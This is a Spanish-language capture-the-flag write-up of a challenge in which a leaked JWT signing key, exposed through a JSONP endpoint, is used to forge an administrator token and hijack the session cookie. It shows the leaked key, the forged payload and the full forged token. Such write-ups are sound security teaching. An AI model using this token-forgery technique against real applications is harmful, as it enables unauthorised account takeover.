## 🔐 Escalada de privilegios vía JWT – Desafío "Consulta de multas"

---

### 🎯 Objetivo del desafío

Acceder como **administrador** para poder "pagar" las multas de Ignacio, quien considera que son injustas. Se nos provee:

- Usuario de Ignacio: `ignacio_123@yopmail.com`
- Contraseña: `12345678`
- Email del administrador: `administrador_multas@yopmail.com`

---

### 🧪 Paso 1: Inspección de la cookie de autenticación

Una vez logueados como Ignacio, se detecta una cookie con nombre `auth` que contiene un JWT:

```
e.g: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImlnbmFjaW9fMTIzQHlvcG1haWwuY29tIiwiZXhwIjoxNzQ0ODUzNTY2LCJlbWFpbCI6ImlnbmFjaW9fMTIzQHlvcG1haWwuY29tIiwib3JpZ19pYXQiOjE3NDQyNDg3NjZ9.6VBuluAsIjoDKpDg7x54yTlL5sbc5_6w3piwHt_lWjs
```

![📸 **Imagen 1**](./img/token.png)

---

### 🔍 Paso 2: Descubrimiento de información sensible vía JSONP

Al navegar la aplicación se detecta una request tipo **JSONP** en la siguiente URL:

```
https://<dominio>/jsonp/?callback=procesarDatos
```

Esta respuesta expone una variable clave:

```json
SECRET_KEY: "123456@pz*+2p(e10(n7891)"
```

![📸 **Imagen 2**](./img/clave.png)
---

### 🧩 Paso 3: Generación de nuevo JWT con privilegios de administrador

Con la clave obtenida, generamos un JWT con los datos del administrador:

```json
{
  "user_id": 1,
  "username": "administrador_multas@yopmail.com",
  "email": "administrador_multas@yopmail.com",
  "exp": 1744853751,
  "orig_iat": 1744248951
}
```

Usamos `HS256` como algoritmo y firmamos el token con la clave:

```
123456@pz*+2p(e10(n7891)
```

🔐 **JWT generado:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluaXN0cmFkb3JfbXVsdGFzQHlvcG1haWwuY29tIiwiZXhwIjoxNzQ0ODUzNzUxLCJlbWFpbCI6ImFkbWluaXN0cmFkb3JfbXVsdGFzQHlvcG1haWwuY29tIiwib3JpZ19pYXQiOjE3NDQyNDg5NTF9.UfWrAMKKQUtOmVgIuOrhK0yb99Kp-jTYRRCkBBkXboU
```

---

### 🚪 Paso 4: Suplantación de sesión y acceso como administrador

Se reemplaza el valor de la cookie `auth` por el nuevo JWT forjado y al recargar la página `/perfil/`, se accede correctamente como **administrador**.

Desde ahí se habilita la opción para "pagar" las multas.

---

### 📌 Conclusión

Este desafío expone cómo una mala práctica (exposición de `SECRET_KEY`) combinada con JWT mal implementado puede comprometer completamente la seguridad de una aplicación. En entornos reales esto permitiría tomar control total sobre cuentas sensibles.